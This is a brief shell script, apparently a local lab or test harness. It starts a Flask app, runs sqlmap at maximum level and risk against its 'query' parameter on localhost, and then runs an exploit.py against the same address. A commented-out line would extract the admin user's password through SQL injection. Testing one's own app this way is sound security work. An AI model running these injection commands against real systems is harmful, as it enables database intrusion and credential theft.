export FLASK_APP=website/app.py
flask run > access.log 2>&1 &
rm -rfv /home/hjalti/.local/share/sqlmap/output/localhost
#sqlmap --dbms=sqlite --level=5 --risk=3 -p query --data "query=asdf" -u 'http://localhost:5000/' --sql-query="select password from users where username='admin'" --time-sec=4
sqlmap --dbms=sqlite --level=5 --risk=3 -p query --data "query=asdf" -u 'http://localhost:5000/' --time-sec=4
python exploit.py https://localhost:5000/
killall flask
